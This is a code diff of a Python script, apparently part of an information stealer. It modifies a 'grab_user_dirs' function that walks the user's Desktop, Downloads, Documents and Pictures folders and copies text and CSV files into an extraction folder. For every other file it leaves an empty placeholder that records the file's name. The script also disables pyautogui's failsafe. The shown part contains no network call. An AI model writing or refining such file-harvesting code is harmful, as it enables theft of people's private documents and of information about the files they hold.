@@ -33,13 +33,15 @@ pyautogui.FAILSAFE = False
 
 def grab_user_dirs():
     """
-    Copies all .txt, .csv, .pdf and .docx files from
+    Copies all .txt and .csv files from
     the user’s Desktop, Downloads, Documents and Pictures
-    into EXTRACT_FOLDER/grabs/<FolderName>.
+    into EXTRACT_FOLDER/grabs/<FolderName>. 
+    For any other file type, drops an empty
+    placeholder <original_filename>.txt so you get notified it existed.
     """
     home = os.path.expanduser("~")
     target_root = os.path.join(EXTRACT_FOLDER, "grabs")
-    extensions = {".txt", ".csv", ".pdf", ".docx"}
+    text_exts = {".txt", ".csv"}
 
     for folder in ("Desktop", "Downloads", "Documents", "Pictures"):
         src = os.path.join(home, folder)
@@ -47,16 +49,32 @@ def grab_user_dirs():
         if not os.path.isdir(src):
             continue
         os.makedirs(dst, exist_ok=True)
+
         for root, _, files in os.walk(src):
             for f in files:
-                if os.path.splitext(f)[1].lower() in extensions:
+                src_path = os.path.join(root, f)
+                if not os.path.isfile(src_path):
+                    continue
+
+                name, ext = os.path.splitext(f)
+                if ext.lower() in text_exts:
+                    # copy real text/csv
                     try:
-                        shutil.copy2(
-                            os.path.join(root, f),
-                            os.path.join(dst, f)
-                        )
+                        shutil.copy2(src_path, os.path.join(dst, f))
                     except Exception:
                         pass
+                else:
+                    # create an empty placeholder .txt
+                    placeholder = f"{f}.txt"
+                    placeholder_path = os.path.join(dst, placeholder)
+                    try:
+                        # if it doesn't exist already, touch it
+                        if not os.path.exists(placeholder_path):
+                            with open(placeholder_path, "w"):
+                                pass
+                    except Exception:
+                        pass
+
 
 
 def resource_path(filename):
